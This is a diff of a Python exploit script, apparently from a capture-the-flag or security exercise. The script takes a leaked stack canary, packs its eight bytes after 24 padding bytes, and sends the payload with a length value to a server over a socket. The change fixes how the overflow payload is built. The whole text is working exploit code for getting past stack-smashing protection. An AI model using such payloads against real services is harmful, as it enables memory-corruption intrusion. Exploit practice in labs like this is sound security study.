@@ -1,4 +1,5 @@
 import socket
+import struct
 import sys, os
 
 #create a socket to read from file handler
@@ -59,20 +60,14 @@ filename = 'leaked_data.txt'
 with open(filename, 'w') as file_object:
     file_object.write(write_to_file)
 
-canary.reverse()
-canary_str = ''
+strg = b'A' * 24
 for c in range(8):
-	canary_str += canary[c].encode()
-
-#canary_str = canary_str.replace('0x', '\\x')
-#b_canary = bytearray(canary_str, 'utf-8')
-
-print(canary_str)
-print(b_canary)
+	strg += struct.pack('B',b_canary[c])
 
 #send string and length to server
 #s.connect(sock)
-strg = b'A' * 24 + str(b_canary) + b'\n64\n'
+strg += b'\n64\n'
+print(strg)
 s.send(strg)
 data = s.recv(1024)
 s.close()
